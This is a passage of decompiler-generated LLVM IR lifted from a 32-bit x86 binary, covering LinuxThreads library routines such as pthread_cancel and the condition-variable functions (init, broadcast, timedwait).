  %zf.global-to-local = alloca i1, align 1
  %stack_var_-28 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp8, i32* %stack_var_-28, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e46f = load i32, i32* @ebx, align 4
  store i32 %v0_804e46f, i32* %stack_var_-4, align 4
  %v4_804e46f = ptrtoint i32* %stack_var_-4 to i32
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_804e478 = sext i8 %arg1 to i32
  %v13_804e478 = icmp eq i8 %arg1, 1
  store i1 %v13_804e478, i1* %zf.global-to-local, align 1
  store i32 %arg2, i32* @ebx, align 4
  %tmp14 = or i8 %arg1, 1
  %tmp15 = icmp eq i8 %tmp14, 1
  br i1 %tmp15, label %dec_label_pc_804e483, label %dec_label_pc_804e4b9

dec_label_pc_804e483:                             ; preds = %entry
  %v1_804e483 = call i32 @thread_self.8(i32 %v0_804e46f)
  store i32 %v1_804e483, i32* %eax.global-to-local, align 4
  %v1_804e488 = icmp eq i32 %arg2, 0
  store i1 %v1_804e488, i1* %zf.global-to-local, align 1
  store i32 %v1_804e483, i32* %edx.global-to-local, align 4
  br i1 %v1_804e488, label %dec_label_pc_804e494, label %dec_label_pc_804e48e

dec_label_pc_804e48e:                             ; preds = %dec_label_pc_804e483
  %v1_804e48e = add i32 %v1_804e483, 64
  %v2_804e48e = inttoptr i32 %v1_804e48e to i8*
  %v3_804e48e = load i8, i8* %v2_804e48e, align 1
  %v4_804e48e = sext i8 %v3_804e48e to i32
  store i32 %v4_804e48e, i32* %eax.global-to-local, align 4
  %v2_804e492 = inttoptr i32 %arg2 to i32*
  store i32 %v4_804e48e, i32* %v2_804e492, align 4
  %v6_804e494.pre = load i32, i32* %eax.global-to-local, align 4
  %v0_804e498.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e494

dec_label_pc_804e494:                             ; preds = %dec_label_pc_804e483, %dec_label_pc_804e48e
  %v2_804e49c = phi i32 [ %v1_804e483, %dec_label_pc_804e483 ], [ %v0_804e498.pre, %dec_label_pc_804e48e ]
  %v6_804e494 = phi i32 [ %v1_804e483, %dec_label_pc_804e483 ], [ %v6_804e494.pre, %dec_label_pc_804e48e ]
  %v7_804e494 = and i32 %v6_804e494, -256
  %v8_804e494 = or i32 %v7_804e494, %v4_804e478
  store i32 %v8_804e494, i32* %eax.global-to-local, align 4
  %v1_804e498 = add i32 %v2_804e49c, 66
  %v2_804e498 = inttoptr i32 %v1_804e498 to i8*
  %v3_804e498 = load i8, i8* %v2_804e498, align 1
  %v4_804e498 = icmp eq i8 %v3_804e498, 0
  store i1 %v4_804e498, i1* %zf.global-to-local, align 1
  %v3_804e49c = add i32 %v2_804e49c, 64
  %v4_804e49c = inttoptr i32 %v3_804e49c to i8*
  store i8 %arg1, i8* %v4_804e49c, align 1
  %v0_804e49f = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_804e49f, label %dec_label_pc_804e4b7, label %dec_label_pc_804e4a1

dec_label_pc_804e4a1:                             ; preds = %dec_label_pc_804e494
  %v0_804e4a1 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e4a1 = add i32 %v0_804e4a1, 64
  %v2_804e4a1 = inttoptr i32 %v1_804e4a1 to i16*
  %v3_804e4a1 = load i16, i16* %v2_804e4a1, align 2
  %v9_804e4a1 = icmp eq i16 %v3_804e4a1, 256
  store i1 %v9_804e4a1, i1* %zf.global-to-local, align 1
  %v1_804e4a7 = icmp eq i1 %v9_804e4a1, false
  br i1 %v1_804e4a7, label %dec_label_pc_804e4b7, label %dec_label_pc_804e4a9

dec_label_pc_804e4a9:                             ; preds = %dec_label_pc_804e4a1
  store i32 %v4_804e46f, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-28, align 4
  %v2_804e4b2 = call i32 @__pthread_do_exit(i32 -1, i32 %v4_804e46f)
  store i32 %v2_804e4b2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e4b7

dec_label_pc_804e4b7:                             ; preds = %dec_label_pc_804e4a1, %dec_label_pc_804e494, %dec_label_pc_804e4a9
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804e4b9.pre = load i32, i32* %stack_var_-28, align 4
  br label %dec_label_pc_804e4b9

dec_label_pc_804e4b9:                             ; preds = %entry, %dec_label_pc_804e4b7
  %v2_804e4b9 = phi i32 [ %tmp8, %entry ], [ %v2_804e4b9.pre, %dec_label_pc_804e4b7 ]
  %v0_804e4bc = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_804e4b7 ]
  store i32 %v2_804e4b9, i32* %edx.global-to-local, align 4
  ret i32 %v0_804e4bc

; uselistorder directives
  uselistorder i1 %v9_804e4a1, { 1, 0 }
  uselistorder i32 %v1_804e483, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32 (i32)* @thread_self.8, { 7, 0, 6, 4, 5, 2, 3, 1 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder i8 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_804e4b9, { 1, 0 }
  uselistorder label %dec_label_pc_804e4b7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e494, { 1, 0 }
}

define i32 @pthread_cancel(i32 %arg1) local_unnamed_addr {
entry:
  %zf.global-to-local = alloca i1, align 1
  store i32 0, i32* @edx, align 4
  %v0_804e4c2 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_804e4cc = urem i32 %arg1, 1024
  %v2_804e4cc = icmp eq i32 %v1_804e4cc, 0
  %v2_804e4d1 = mul nuw nsw i32 %v1_804e4cc, 16
  store i1 %v2_804e4cc, i1* %zf.global-to-local, align 1
  %v1_804e4d4 = add i32 %v2_804e4d1, ptrtoint (i32* @global_var_805e6a0.146 to i32)
  store i32 %v1_804e4d4, i32* @edi, align 4
  store i32 %v1_804e4d4, i32* @eax, align 4
  %v1_804e4dc = call i32 @__pthread_lock(i32 %v0_804e4c2)
  %v0_804e4e1 = load i32, i32* @edi, align 4
  %v1_804e4e1 = add i32 %v0_804e4e1, 8
  %v2_804e4e1 = inttoptr i32 %v1_804e4e1 to i32*
  %v3_804e4e1 = load i32, i32* %v2_804e4e1, align 4
  store i32 %v3_804e4e1, i32* @ebx, align 4
  %v1_804e4e4 = icmp eq i32 %v3_804e4e1, 0
  store i1 %v1_804e4e4, i1* %zf.global-to-local, align 1
  br i1 %v1_804e4e4, label %dec_label_pc_804e4ed, label %dec_label_pc_804e4e8

dec_label_pc_804e4e8:                             ; preds = %entry
  %v1_804e4e8 = add i32 %v3_804e4e1, 16
  %v2_804e4e8 = inttoptr i32 %v1_804e4e8 to i32*
  %v3_804e4e8 = load i32, i32* %v2_804e4e8, align 4
  %v4_804e4e8 = load i32, i32* @esi, align 4
  %v15_804e4e8 = icmp eq i32 %v3_804e4e8, %v4_804e4e8
  store i1 %v15_804e4e8, i1* %zf.global-to-local, align 1
  br i1 %v15_804e4e8, label %dec_label_pc_804e4fd, label %dec_label_pc_804e4ed

dec_label_pc_804e4ed:                             ; preds = %dec_label_pc_804e4e8, %entry
  %v0_804e4ed = load i32, i32* @esp, align 4
  %v9_804e4ed = icmp eq i32 %v0_804e4ed, 12
  store i1 %v9_804e4ed, i1* %zf.global-to-local, align 1
  %v1_804e4f1 = inttoptr i32 %v0_804e4e1 to i32*
  %v2_804e4f1 = call i32 @__pthread_unlock(i32* %v1_804e4f1)
  br label %dec_label_pc_804e567

dec_label_pc_804e4fd:                             ; preds = %dec_label_pc_804e4e8
  %v1_804e4fd = add i32 %v3_804e4e1, 64
  %v2_804e4fd = inttoptr i32 %v1_804e4fd to i8*
  %v3_804e4fd = load i8, i8* %v2_804e4fd, align 1
  %v12_804e4fd = icmp eq i8 %v3_804e4fd, 1
  store i1 %v12_804e4fd, i1* %zf.global-to-local, align 1
  %v1_804e501 = add i32 %v3_804e4e1, 66
  %v2_804e501 = inttoptr i32 %v1_804e501 to i8*
  %v3_804e501 = load i8, i8* %v2_804e501, align 1
  store i8 1, i8* %v2_804e501, align 1
  %v0_804e509 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_804e509, label %dec_label_pc_804e50f, label %dec_label_pc_804e50b

dec_label_pc_804e50b:                             ; preds = %dec_label_pc_804e4fd
  %v1_804e50b = icmp eq i8 %v3_804e501, 0
  store i1 %v1_804e50b, i1* %zf.global-to-local, align 1
  br i1 %v1_804e50b, label %dec_label_pc_804e51a, label %dec_label_pc_804e50f

dec_label_pc_804e50f:                             ; preds = %dec_label_pc_804e50b, %dec_label_pc_804e4fd
  %v0_804e50f = load i32, i32* @esp, align 4
  %v9_804e50f = icmp eq i32 %v0_804e50f, 12
  store i1 %v9_804e50f, i1* %zf.global-to-local, align 1
  %v0_804e512 = load i32, i32* @edi, align 4
  %v1_804e513 = inttoptr i32 %v0_804e512 to i32*
  %v2_804e513 = call i32 @__pthread_unlock(i32* %v1_804e513)
  br label %dec_label_pc_804e565

dec_label_pc_804e51a:                             ; preds = %dec_label_pc_804e50b
  %v1_804e51a = add i32 %v3_804e4e1, 444
  %v2_804e51a = inttoptr i32 %v1_804e51a to i32*
  %v3_804e51a = load i32, i32* %v2_804e51a, align 4
  store i32 0, i32* @esi, align 4
  %v1_804e525 = icmp eq i32 %v3_804e51a, 0
  store i1 %v1_804e525, i1* %zf.global-to-local, align 1
  br i1 %v1_804e525, label %dec_label_pc_804e53c, label %dec_label_pc_804e529

dec_label_pc_804e529:                             ; preds = %dec_label_pc_804e51a
  %v3_804e525 = trunc i32 %v3_804e51a to i8
  %v5_804e52e = add i32 %v3_804e51a, 4
  %v6_804e52e = inttoptr i32 %v5_804e52e to i32*
  %v7_804e52e = load i32, i32* %v6_804e52e, align 4
  call void @__pseudo_call(i32 %v7_804e52e)
  %v0_804e531 = load i32, i32* @esp, align 4
  %v6_804e531 = icmp eq i32 %v0_804e531, -16
  store i1 %v6_804e531, i1* %zf.global-to-local, align 1
  store i32 %v3_804e51a, i32* @esi, align 4
  %v3_804e536 = add i32 %v3_804e4e1, 440
  %v4_804e536 = inttoptr i32 %v3_804e536 to i8*
  store i8 %v3_804e525, i8* %v4_804e536, align 1
  br label %dec_label_pc_804e53c

dec_label_pc_804e53c:                             ; preds = %dec_label_pc_804e51a, %dec_label_pc_804e529
  %v0_804e53c = load i32, i32* @esp, align 4
  %v9_804e53c = icmp eq i32 %v0_804e53c, 12
  store i1 %v9_804e53c, i1* %zf.global-to-local, align 1
  %v0_804e53f = load i32, i32* @edi, align 4
  %v1_804e540 = inttoptr i32 %v0_804e53f to i32*
  %v2_804e540 = call i32 @__pthread_unlock(i32* %v1_804e540)
  %v0_804e548 = load i32, i32* @esi, align 4
  %v1_804e548 = icmp eq i32 %v0_804e548, 0
  store i1 %v1_804e548, i1* %zf.global-to-local, align 1
  br i1 %v1_804e548, label %dec_label_pc_804e557, label %dec_label_pc_804e54c

dec_label_pc_804e54c:                             ; preds = %dec_label_pc_804e53c
  store i1 false, i1* %zf.global-to-local, align 1
  %v1_804e550 = call i32 @__pthread_restart_new(i32 %v3_804e4e1)
  br label %dec_label_pc_804e565

dec_label_pc_804e557:                             ; preds = %dec_label_pc_804e53c
  %v0_804e559 = load i32, i32* @global_var_8062a8c.154, align 4
  %v2_804e560 = call i32 @kill(i32 %v0_804e559, i32 0)
  br label %dec_label_pc_804e565

dec_label_pc_804e565:                             ; preds = %dec_label_pc_804e54c, %dec_label_pc_804e50f, %dec_label_pc_804e557
  store i1 true, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804e567

dec_label_pc_804e567:                             ; preds = %dec_label_pc_804e4ed, %dec_label_pc_804e565
  %storemerge = phi i32 [ 3, %dec_label_pc_804e4ed ], [ 0, %dec_label_pc_804e565 ]
  %v0_804e567 = load i32, i32* @esp, align 4
  %v9_804e567 = icmp eq i32 %v0_804e567, -28
  store i1 %v9_804e567, i1* %zf.global-to-local, align 1
  ret i32 %storemerge

; uselistorder directives
  uselistorder i1 %v15_804e4e8, { 1, 0 }
  uselistorder i32 %v3_804e4e1, { 4, 5, 1, 2, 0, 3, 6, 7 }
  uselistorder label %dec_label_pc_804e567, { 1, 0 }
  uselistorder label %dec_label_pc_804e565, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e53c, { 1, 0 }
}

define i32 @enqueue.9() local_unnamed_addr {
entry:
  %v0_804e571 = load i32, i32* @edx, align 4
  %v1_804e571 = add i32 %v0_804e571, 24
  %v2_804e571 = inttoptr i32 %v1_804e571 to i32*
  %v3_804e571 = load i32, i32* %v2_804e571, align 4
  store i32 %v3_804e571, i32* @ebx, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @remove_from_queue.10() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e58d = load i32, i32* @ebx, align 4
  store i32 %v0_804e58d, i32* %stack_var_-4, align 4
  %v0_804e58e = load i32, i32* @eax, align 4
  br label %dec_label_pc_804e5ac

dec_label_pc_804e592:                             ; preds = %dec_label_pc_804e5ac
  %v1_804e592 = load i32, i32* @edx, align 4
  %v12_804e592 = icmp eq i32 %v2_804e5ac, %v1_804e592
  %v1_804e594 = icmp eq i1 %v12_804e592, false
  %v1_804e5a9 = add i32 %v2_804e5ac, 8
  br i1 %v1_804e594, label %dec_label_pc_804e5ac, label %dec_label_pc_804e596

dec_label_pc_804e596:                             ; preds = %dec_label_pc_804e592
  %v2_804e596 = inttoptr i32 %v1_804e5a9 to i32*
  %v3_804e596 = load i32, i32* %v2_804e596, align 4
  store i32 %v3_804e596, i32* %v1_804e5ac, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v2_804e596, align 4
  %v2_804e5b4.pre = load i32, i32* %stack_var_-4, align 4
  %v0_804e5b5.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e5b4

dec_label_pc_804e5ac:                             ; preds = %dec_label_pc_804e592, %entry
  %v1_804e599 = phi i32 [ %v0_804e58e, %entry ], [ %v1_804e5a9, %dec_label_pc_804e592 ]
  %v1_804e5ac = inttoptr i32 %v1_804e599 to i32*
  %v2_804e5ac = load i32, i32* %v1_804e5ac, align 4
  %v1_804e5ae = icmp eq i32 %v2_804e5ac, 0
  %v1_804e5b0 = icmp eq i1 %v1_804e5ae, false
  br i1 %v1_804e5b0, label %dec_label_pc_804e592, label %dec_label_pc_804e5b2

dec_label_pc_804e5b2:                             ; preds = %dec_label_pc_804e5ac
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e5b4

dec_label_pc_804e5b4:                             ; preds = %dec_label_pc_804e596, %dec_label_pc_804e5b2
  %v0_804e5b5 = phi i32 [ %v0_804e5b5.pre, %dec_label_pc_804e596 ], [ 0, %dec_label_pc_804e5b2 ]
  %v2_804e5b4 = phi i32 [ %v2_804e5b4.pre, %dec_label_pc_804e596 ], [ %v0_804e58d, %dec_label_pc_804e5b2 ]
  store i32 %v2_804e5b4, i32* @ebx, align 4
  ret i32 %v0_804e5b5

; uselistorder directives
  uselistorder i32 %v2_804e5ac, { 2, 0, 1 }
  uselistorder i32* %v1_804e5ac, { 1, 0 }
  uselistorder i32 %v1_804e5a9, { 1, 0 }
  uselistorder label %dec_label_pc_804e5b4, { 1, 0 }
}

define i32 @pthread_cond_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp1 = ptrtoint i32* %arg1 to i32
  store i32 %tmp1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %arg1, align 4
  %v1_804e5c0 = add i32 %tmp1, 4
  %v2_804e5c0 = inttoptr i32 %v1_804e5c0 to i32*
  store i32 0, i32* %v2_804e5c0, align 4
  %v0_804e5c7 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e5c7 = add i32 %v0_804e5c7, 8
  %v2_804e5c7 = inttoptr i32 %v1_804e5c7 to i32*
  store i32 0, i32* %v2_804e5c7, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0
}

define i32 @__GI_pthread_cond_destroy(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 16
}

define i32 @pthread_condattr_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__GI_pthread_condattr_destroy() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @pthread_condattr_getpshared(i32* %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* %arg1, align 4
  ret i32 0
}

define i32 @pthread_condattr_setpshared(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = or i32 %arg1, 1
  %tmp2 = icmp eq i32 %tmp, 1
  br i1 %tmp2, label %dec_label_pc_804e602, label %dec_label_pc_804e609

dec_label_pc_804e602:                             ; preds = %entry
  br label %dec_label_pc_804e609

dec_label_pc_804e609:                             ; preds = %entry, %dec_label_pc_804e602
  %v0_804e609 = phi i32 [ 22, %entry ], [ 38, %dec_label_pc_804e602 ]
  ret i32 %v0_804e609

; uselistorder directives
  uselistorder label %dec_label_pc_804e609, { 1, 0 }
}

define i32 @__pthread_set_own_extricate_if.11(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804e60a = load i32, i32* @esi, align 4
  %v0_804e60b = load i32, i32* @edx, align 4
  store i32 %v0_804e60b, i32* @esi, align 4
  %v0_804e60d = load i32, i32* @ebx, align 4
  %v0_804e60e = load i32, i32* @eax, align 4
  store i32 %v0_804e60e, i32* @ebx, align 4
  %v1_804e613 = icmp eq i32 %v0_804e60b, 0
  br i1 %v1_804e613, label %dec_label_pc_804e61f, label %dec_label_pc_804e617

dec_label_pc_804e617:                             ; preds = %entry
  %v1_804e617 = add i32 %v0_804e60e, 64
  %v2_804e617 = inttoptr i32 %v1_804e617 to i8*
  %v3_804e617 = load i8, i8* %v2_804e617, align 1
  %v4_804e617 = icmp eq i8 %v3_804e617, 0
  %v1_804e61b = icmp eq i1 %v4_804e617, false
  br i1 %v1_804e61b, label %dec_label_pc_804e641, label %dec_label_pc_804e629

dec_label_pc_804e61f:                             ; preds = %entry
  %v1_804e61f = add i32 %v0_804e60e, 28
  %v2_804e61f = inttoptr i32 %v1_804e61f to i32*
  %v3_804e61f = load i32, i32* %v2_804e61f, align 4
  store i32 %v3_804e61f, i32* @eax, align 4
  store i32 %v0_804e60e, i32* @edx, align 4
  %v1_804e624 = call i32 @__pthread_lock(i32 %v0_804e60d)
  %v1_804e62b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e629

dec_label_pc_804e629:                             ; preds = %dec_label_pc_804e617, %dec_label_pc_804e61f
  %v1_804e62b = phi i32 [ %v0_804e60e, %dec_label_pc_804e617 ], [ %v1_804e62b.pre, %dec_label_pc_804e61f ]
  %v2_804e62b = add i32 %v1_804e62b, 444
  %v3_804e62b = inttoptr i32 %v2_804e62b to i32*
  store i32 %v0_804e60b, i32* %v3_804e62b, align 4
  %v1_804e631 = icmp eq i1 %v1_804e613, false
  br i1 %v1_804e631, label %dec_label_pc_804e641, label %dec_label_pc_804e633

dec_label_pc_804e633:                             ; preds = %dec_label_pc_804e629
  %v0_804e636 = load i32, i32* @ebx, align 4
  %v1_804e636 = add i32 %v0_804e636, 28
  %v2_804e636 = inttoptr i32 %v1_804e636 to i32*
  %v3_804e636 = load i32, i32* %v2_804e636, align 4
  %v1_804e639 = inttoptr i32 %v3_804e636 to i32*
  %v2_804e639 = call i32 @__pthread_unlock(i32* %v1_804e639)
  br label %dec_label_pc_804e641

dec_label_pc_804e641:                             ; preds = %dec_label_pc_804e629, %dec_label_pc_804e617, %dec_label_pc_804e633
  %v2_804e641 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_804e60d, i32* @ebx, align 4
  store i32 %v0_804e60a, i32* @esi, align 4
  ret i32 %v2_804e641

; uselistorder directives
  uselistorder i32 %v0_804e60b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e641, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e629, { 1, 0 }
}

define i32 @restart.12() local_unnamed_addr {
entry:
  %v0_804e648 = load i32, i32* @eax, align 4
  %v1_804e649 = call i32 @__pthread_restart_new(i32 %v0_804e648)
  ret i32 %v1_804e649
}

define i32 @pthread_cond_broadcast(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @edx, align 4
  %v0_804e655 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_804e65f = call i32 @__pthread_lock(i32 %v0_804e655)
  %v0_804e667 = load i32, i32* @ebx, align 4
  %v1_804e667 = add i32 %v0_804e667, 8
  %v2_804e667 = inttoptr i32 %v1_804e667 to i32*
  %v3_804e667 = load i32, i32* %v2_804e667, align 4
  store i32 %v3_804e667, i32* @esi, align 4
  store i32 0, i32* %v2_804e667, align 4
  %v0_804e671 = load i32, i32* @ebx, align 4
  %v1_804e672 = inttoptr i32 %v0_804e671 to i32*
  %v2_804e672 = call i32 @__pthread_unlock(i32* %v1_804e672)
  %v0_804e6961 = load i32, i32* @esi, align 4
  %v1_804e6962 = icmp eq i32 %v0_804e6961, 0
  %v1_804e6989 = icmp eq i1 %v1_804e6962, false
  br i1 %v1_804e6989, label %dec_label_pc_804e67c, label %dec_label_pc_804e69a

dec_label_pc_804e67c:                             ; preds = %entry, %dec_label_pc_804e67c
  %v0_804e67c = phi i32 [ %v0_804e696, %dec_label_pc_804e67c ], [ %v0_804e6961, %entry ]
  %v1_804e67c = add i32 %v0_804e67c, 8
  %v2_804e67c = inttoptr i32 %v1_804e67c to i32*
  %v3_804e67c = load i32, i32* %v2_804e67c, align 4
  store i32 %v3_804e67c, i32* @ebx, align 4
  %v1_804e67f = add i32 %v0_804e67c, 441
  %v2_804e67f = inttoptr i32 %v1_804e67f to i8*
  store i8 1, i8* %v2_804e67f, align 1
  %v0_804e686 = load i32, i32* @esi, align 4
  %v1_804e686 = add i32 %v0_804e686, 8
  %v2_804e686 = inttoptr i32 %v1_804e686 to i32*
  store i32 0, i32* %v2_804e686, align 4
  %v0_804e68d = load i32, i32* @esi, align 4
  store i32 %v0_804e68d, i32* @eax, align 4
  %v0_804e68f = load i32, i32* @ebx, align 4
  store i32 %v0_804e68f, i32* @esi, align 4
  %v0_804e691 = call i32 @restart.12()
  %v0_804e696 = load i32, i32* @esi, align 4
  %v1_804e696 = icmp eq i32 %v0_804e696, 0
  %v1_804e698 = icmp eq i1 %v1_804e696, false
  br i1 %v1_804e698, label %dec_label_pc_804e67c, label %dec_label_pc_804e69a

dec_label_pc_804e69a:                             ; preds = %dec_label_pc_804e67c, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_804e696, { 1, 0 }
  uselistorder i32 %v0_804e67c, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804e67c, { 1, 0 }
}

define i32 @thread_self.13(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_804e6a0 = load i32, i32* @esp, align 4
  %v1_804e6a0 = load i32, i32* @global_var_806338c.133, align 4
  %v7_804e6a0 = icmp ult i32 %v0_804e6a0, %v1_804e6a0
  %v1_804e6ad = icmp eq i1 %v7_804e6a0, false
  br i1 %v1_804e6ad, label %dec_label_pc_804e6de, label %dec_label_pc_804e6af

dec_label_pc_804e6af:                             ; preds = %entry
  %v1_804e6af = load i32, i32* @global_var_8063390.134, align 16
  %v7_804e6af = icmp ult i32 %v0_804e6a0, %v1_804e6af
  br i1 %v7_804e6af, label %dec_label_pc_804e6c4, label %dec_label_pc_804e6b7

dec_label_pc_804e6b7:                             ; preds = %dec_label_pc_804e6af
  %v1_804e6b7 = load i32, i32* @global_var_8063394.135, align 4
  %v7_804e6b7 = icmp ult i32 %v0_804e6a0, %v1_804e6b7
  br i1 %v7_804e6b7, label %dec_label_pc_804e6de, label %dec_label_pc_804e6c4

dec_label_pc_804e6c4:                             ; preds = %dec_label_pc_804e6b7, %dec_label_pc_804e6af
  %v0_804e6c4 = load i32, i32* @global_var_80679f0.137, align 16
  %v1_804e6c4 = icmp eq i32 %v0_804e6c4, 0
  br i1 %v1_804e6c4, label %dec_label_pc_804e6d2, label %dec_label_pc_804e6cd

dec_label_pc_804e6cd:                             ; preds = %dec_label_pc_804e6c4
  %v0_804e6cd = call i32 @__pthread_find_self()
  br label %dec_label_pc_804e6d2

dec_label_pc_804e6d2:                             ; preds = %dec_label_pc_804e6c4, %dec_label_pc_804e6cd
  %v2_804e6d8 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_804e6de

dec_label_pc_804e6de:                             ; preds = %dec_label_pc_804e6b7, %entry, %dec_label_pc_804e6d2
  %v0_804e6de = phi i32 [ ptrtoint (i32* @global_var_80628a0.136 to i32), %dec_label_pc_804e6b7 ], [ ptrtoint (i32* @global_var_80626c0 to i32), %entry ], [ %v2_804e6d8, %dec_label_pc_804e6d2 ]
  ret i32 %v0_804e6de

; uselistorder directives
  uselistorder label %dec_label_pc_804e6de, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e6d2, { 1, 0 }
}

define i32 @cond_extricate_func(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804e6df = load i32, i32* @esi, align 4
  %v0_804e6e0 = load i32, i32* @ebx, align 4
  %v2_804e6e4 = call i32 @thread_self.13(i32 %v0_804e6e0, i32 %v0_804e6df)
  store i32 %arg1, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %v2_804e6e4, i32* @edx, align 4
  %v1_804e6f7 = call i32 @__pthread_lock(i32 %v2_804e6e4)
  store i32 %arg2, i32* @edx, align 4
  %v0_804e700 = load i32, i32* @ebx, align 4
  %v1_804e700 = add i32 %v0_804e700, 8
  store i32 %v1_804e700, i32* @eax, align 4
  %v0_804e703 = call i32 @remove_from_queue.10()
  %v0_804e70b = load i32, i32* @ebx, align 4
  store i32 %v0_804e703, i32* @esi, align 4
  %v1_804e70e = inttoptr i32 %v0_804e70b to i32*
  %v2_804e70e = call i32 @__pthread_unlock(i32* %v1_804e70e)
  %v0_804e716 = load i32, i32* @esi, align 4
  ret i32 %v0_804e716

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @suspend.14() local_unnamed_addr {
entry:
  %v0_804e71e = load i32, i32* @eax, align 4
  %v1_804e71f = call i32 @__pthread_wait_for_restart_signal(i32 %v0_804e71e)
  ret i32 %v1_804e71f
}

define i32 @__GI_pthread_cond_timedwait(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e72a = load i32, i32* @esi, align 4
  %v0_804e72b = load i32, i32* @ebx, align 4
  store i32 %v0_804e72b, i32* %stack_var_-16, align 4
  %v4_804e72b = ptrtoint i32* %stack_var_-16 to i32
  %v2_804e72f = call i32 @thread_self.13(i32 %v0_804e72b, i32 %v0_804e72a)
  store i32 %arg2, i32* @ebp, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_804e740 = add i32 %arg2, 12
  %v2_804e740 = inttoptr i32 %v1_804e740 to i32*
  %v3_804e740 = load i32, i32* %v2_804e740, align 4
  %v9_804e743 = icmp eq i32 %v3_804e740, 3
  br i1 %v9_804e743, label %dec_label_pc_804e75e, label %dec_label_pc_804e748

dec_label_pc_804e748:                             ; preds = %entry
  %v1_804e748 = icmp eq i32 %v3_804e740, 0
  br i1 %v1_804e748, label %dec_label_pc_804e75e, label %dec_label_pc_804e74c

dec_label_pc_804e74c:                             ; preds = %dec_label_pc_804e748
  %v1_804e755 = add i32 %arg2, 8
  %v2_804e755 = inttoptr i32 %v1_804e755 to i32*
  %v3_804e755 = load i32, i32* %v2_804e755, align 4
  %v15_804e755 = icmp eq i32 %v3_804e755, %v2_804e72f
  %v1_804e758 = icmp eq i1 %v15_804e755, false
  br i1 %v1_804e758, label %dec_label_pc_804e74c.dec_label_pc_804e8d0_crit_edge, label %dec_label_pc_804e75e

dec_label_pc_804e74c.dec_label_pc_804e8d0_crit_edge: ; preds = %dec_label_pc_804e74c
  br label %dec_label_pc_804e8d0

dec_label_pc_804e75e:                             ; preds = %dec_label_pc_804e74c, %dec_label_pc_804e748, %entry
  %v2_804e762 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804e762, i32* @edx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v1_804e772 = add i32 %v2_804e72f, 441
  %v2_804e772 = inttoptr i32 %v1_804e772 to i8*
  store i8 0, i8* %v2_804e772, align 1
  store i32 %v2_804e72f, i32* @eax, align 4
  %v0_804e77d = load i32, i32* %stack_var_-28, align 4
  %v2_804e77d = call i32 @__pthread_set_own_extricate_if.11(i32 %v0_804e77d, i32 134538975)
  store i32 %v2_804e72f, i32* @edx, align 4
  %v0_804e786 = load i32, i32* @esi, align 4
  store i32 %v0_804e786, i32* @eax, align 4
  %v1_804e788 = call i32 @__pthread_lock(i32 134538975)
  %v1_804e791 = add i32 %v2_804e72f, 66
  %v2_804e791 = inttoptr i32 %v1_804e791 to i8*
  %v3_804e791 = load i8, i8* %v2_804e791, align 1
  %v4_804e791 = icmp eq i8 %v3_804e791, 0
  br i1 %v4_804e791, label %dec_label_pc_804e7a6, label %dec_label_pc_804e797

